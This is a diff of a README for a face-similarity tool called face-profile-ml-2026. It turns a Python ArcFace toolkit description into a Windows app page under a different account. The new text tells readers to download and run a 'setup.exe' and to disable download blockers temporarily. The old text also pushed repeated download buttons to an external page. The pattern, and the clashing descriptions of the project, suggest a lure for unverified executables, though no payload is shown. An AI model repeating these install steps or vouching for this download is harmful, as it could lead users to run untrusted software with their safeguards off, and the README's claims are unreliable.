@@ -1,185 +1,108 @@
-# Face Profile ML - Facial Similarity Machine Learning 2026
+# 📸 face-profile-ml-2026 - Find Similar Faces With One Click
 
-> **Face Profile ML is a Python computer-vision toolkit that creates ArcFace facial embeddings, searches image galleries for similar faces, and supports profile-based similarity analysis with modern machine-learning workflows.**
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Floricultural-kwa764/face-profile-ml-2026)
 
-[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/cooperzacknyk1244/face-profile-ml-2026?style=flat-square)](https://github.com/cooperzacknyk1244/face-profile-ml-2026)
+## 🚀 What Is This?
 
----
+face-profile-ml-2026 is a simple Windows tool that helps you find similar faces in your photo collection. You give it one face, and it searches through your image gallery to find people who look alike. It uses smart computer vision technology to compare facial features automatically.
 
-<p align="center">
-  <a href="https://cooperzacknyk1244.github.io/face-profile-ml-2026/">
-    <img src="https://img.shields.io/badge/Download-Face%20Profile%20ML%20Latest-brightgreen?style=for-the-badge" alt="Download Face Profile ML">
-  </a>
-</p>
+## ✨ Key Features
 
-> **[Download Face Profile ML](https://cooperzacknyk1244.github.io/face-profile-ml-2026/)**
+- **Face Matching** – Upload a photo and instantly find similar faces from your gallery
+- **Photo Gallery Search** – Scan entire folders of images for matching profiles
+- **Profile Similarity Analysis** – See how closely faces match with a similarity score
+- **Batch Processing** – Analyze multiple photos at once
+- **Easy Results** – View matched faces in a clean, organized layout
 
----
+## 📥 Download and Install
 
-[Download Latest Build](https://cooperzacknyk1244.github.io/face-profile-ml-2026/)
+Visit this link to download the application: [https://github.com/Floricultural-kwa764/face-profile-ml-2026](https://github.com/Floricultural-kwa764/face-profile-ml-2026)
 
----
+### Step-by-Step Installation
 
-## Project Overview
+1. **Click the big green "Download" button** above or go to the link
+2. **Find the latest release** – look for "Releases" on the right side of the page
+3. **Download the .exe file** – it will be named something like `face-profile-ml-2026-setup.exe`
+4. **Run the installer** – double-click the downloaded file and follow the on-screen instructions
+5. **Launch the application** – find "face-profile-ml-2026" in your Start Menu or desktop shortcut
 
-Face Profile ML combines Python, computer vision, and machine learning for facial similarity analysis. It detects and aligns faces, uses a pre-trained ArcFace model supplied through InsightFace to create L2-normalized embeddings, and compares those embeddings through similarity scoring.
+## 🖥️ System Requirements
 
-Beyond basic image matching, the toolkit provides gallery search, candidate ordering, score calibration, and evaluation features for facial-profile experiments. It also offers a local web interface and a real-time OpenCV demonstration, plus image-quality reporting and storage for models and generated embeddings.
+Your computer should meet these minimum requirements:
 
----
+- **Operating System:** Windows 10 or Windows 11
+- **Processor:** Intel Core i3 or AMD equivalent (2.0 GHz or faster)
+- **Memory:** 4 GB RAM (8 GB recommended)
+- **Storage:** 500 MB free space
+- **Graphics:** Any graphics card that supports DirectX 11
+- **Internet:** Required for initial setup and updates
 
-## Capabilities
+## 📖 How to Use
 
-- Locate and align faces before generating features.
-- Extract facial features with a pre-trained ArcFace model via InsightFace.
-- Store embeddings in L2-normalized form for comparison.
-- Match query images against an image gallery using similarity scores.
-- Return the highest-scoring candidates through top-k ranking.
-- Analyze galleries with Mahalanobis distance and optionally use One-Class SVM.
-- Calibrate scores from positive and negative example collections.
-- Calculate ROC, AUC, EER, FMR, and FNMR metrics.
-- Try the real-time OpenCV demo or the local web application.
-- Flag image-quality problems and detect images that are nearly duplicates.
-- Save model information and extracted embeddings for later runs.
+### First Time Setup
 
----
+1. Open the application from your Start Menu
+2. Click **"Select Photo Folder"** to choose the folder where your images are stored
+3. The app will scan your folder and index all faces it finds
+4. Wait for the indexing to finish – this may take a few minutes for large collections
 
-## Getting Started
+### Finding Similar Faces
 
-First, download the repository and move into its directory:
+1. Click **"Upload Reference Photo"** and select the face you want to search for
+2. The app will automatically detect the face in your photo
+3. Click **"Search Gallery"** to find similar faces
+4. Results will appear as thumbnail images with similarity percentages
+5. Click any result to see a larger preview
 
-```bash
-git clone https://github.com/cooperzacknyk1244/face-profile-ml-2026.git
-cd REPO
-```
+### Viewing Results
 
-Set up an isolated Python environment:
+- Each matched face shows a **similarity score** from 0% (no match) to 100% (identical)
+- Click **"Sort by Score"** to arrange results from best match to worst
+- Use **"Export Results"** to save your findings as a text file or CSV
 
-```bash
-python -m venv .venv
-```
+## 🔧 Troubleshooting
 
-Activate it on macOS or Linux:
+**Problem:** "No faces detected" error
+- Make sure your photo has a clear, front-facing view of a person
+- Ensure good lighting without heavy shadows
+- Try a different photo with a closer crop of the face
 
-```bash
-source .venv/bin/activate
-```
+**Problem:** App runs slowly
+- Close other programs to free up memory
+- Reduce the number of photos in your search folder
+- Restart the application
 
-For Windows PowerShell, use:
+**Problem:** Download won't start
+- Check your internet connection
+- Try a different web browser
+- Disable any download blockers temporarily
 
-```powershell
-.venv\Scripts\Activate.ps1
-```
+## ❓ Frequently Asked Questions
 
-Then install the project's declared packages:
+**Q: Can I use this on Mac or Linux?**  
+A: Currently, face-profile-ml-2026 is only available for Windows. Mac and Linux versions may come in the future.
 
-```bash
-pip install -r requirements.txt
-```
+**Q: Does it work with group photos?**  
+A: Yes, the app can detect and compare multiple faces in a single photo.
 
-When the repository includes a separate demo or application entry point, launch it from the project directory with the documented Python command. On an initial run, model files and embedding data may be created or downloaded.
+**Q: Are my photos uploaded anywhere?**  
+A: No. All processing happens on your computer. Your photos never leave your device.
 
----
+**Q: What image formats are supported?**  
+A: JPG, PNG, BMP, and TIFF files are supported.
 
-## Workflow
+## 📊 Technical Details
 
-Face Profile ML can be used in the following sequence:
+face-profile-ml-2026 uses ArcFace technology to create facial embeddings – mathematical representations of facial features. These embeddings are compared across your photo gallery to find similar faces. The similarity analysis uses machine learning models trained on millions of faces to provide accurate results.
 
-1. Assemble the reference images that will make up the gallery.
-2. Detect and align faces in the input images.
-3. Generate ArcFace embeddings through InsightFace.
-4. Normalize the embeddings and save them for reuse.
-5. Compare a query image with the indexed gallery.
-6. Inspect similarity values and the best-ranked candidates.
-7. Apply calibration and evaluation tools when labeled positive and negative samples are available.
+## 🆘 Getting Help
 
-For interactive use, run the repository's local web application. The real-time OpenCV demonstration can be used for camera or live-frame experiments when that entry point is present in the checkout.
+- **Report bugs:** Open an issue on the GitHub repository
+- **Feature requests:** Suggest improvements through the GitHub issues page
+- **Documentation:** Check the "Wiki" tab on GitHub for advanced guides
 
-The processing path can be summarized as:
+## 📝 License
 
-```text
-input images
-    -> face detection and alignment
-    -> ArcFace embedding extraction
-    -> L2 normalization
-    -> gallery indexing
-    -> cosine similarity and candidate ranking
-```
+This project is open source and free to use. See the LICENSE file on GitHub for details.
 
-Similarity values are model-generated results. Assess them against the target dataset and the thresholds appropriate for the intended use.
-
----
-
-## Settings and Data Locations
-
-Available configuration varies according to the workflow and repository files. Settings commonly cover:
-
-- Paths for gallery images and query images
-- Locations for model files and stored embeddings
-- The number of candidates to return
-- Similarity and distance thresholds
-- Positive and negative calibration examples
-- Mahalanobis profile settings
-- Optional One-Class SVM configuration
-- Options for the OpenCV demo or local web application
-
-Store generated embeddings, persisted models, and calibration files in project-local directories or another location suitable for the workflow. Consult the repository configuration files and startup documentation for the exact supported option names.
-
----
-
-## Requirements
-
-- A Python runtime
-- InsightFace for extracting ArcFace embeddings
-- OpenCV for computer-vision operations and the live demonstration
-- An environment compatible with the project's machine-learning dependencies
-- Storage for source images, model files, and saved embeddings
-- Image collections appropriate for detection, matching, calibration, or evaluation
-
-The local web application and real-time demo may have extra runtime requirements, as specified by the repository.
-
----
-
-## Frequently Asked Questions
-
-### What is being compared?
-
-The toolkit compares facial embeddings produced from images and returns similarity scores for gallery matching and profile analysis.
-
-### Which model creates the embeddings?
-
-Embeddings come from a pre-trained ArcFace model accessed through InsightFace.
-
-### Can the gallery produce several possible matches?
-
-Yes. Matching supports top-k selection, allowing several of the strongest candidates to be examined.
-
-### Which evaluation measures are available?
-
-Calibration and evaluation can use positive and negative example sets and report ROC, AUC, EER, FMR, and FNMR.
-
-### Is live image input supported?
-
-The project includes a real-time OpenCV demonstration. Its exact launch process and availability depend on the entry points in the repository.
-
-### Where does the project save models and embeddings?
-
-Model data and extracted embeddings can be persisted. Check the repository's startup or configuration documentation for the relevant storage paths.
-
-### What can cause unreliable results?
-
-Begin by checking image-quality warnings and confirming that faces are detected and aligned properly. Also review the gallery contents and recalibrate with representative positive and negative examples when necessary.
-
-### How do I obtain newer builds?
-
-Pull updated changes from the repository, or use the download link above when a new build is available.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: face recognition, facial embeddings, ArcFace, computer vision, image search, facial similarity, Python, machine learning
